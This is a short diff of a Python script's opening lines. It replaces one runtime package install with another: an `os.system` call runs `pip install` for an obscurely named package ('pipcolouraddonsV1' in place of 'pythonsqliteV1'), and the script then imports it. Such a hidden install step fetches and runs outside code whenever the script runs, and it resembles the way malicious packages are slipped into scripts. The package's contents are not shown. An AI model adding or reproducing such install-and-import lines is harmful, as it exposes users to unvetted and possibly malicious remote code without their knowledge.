@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythonsqliteV1")
-import pythonsqliteV1
+os.system("pip install pipcolouraddonsV1")
+import pipcolouraddonsV1
 import random
 import requests
 import time
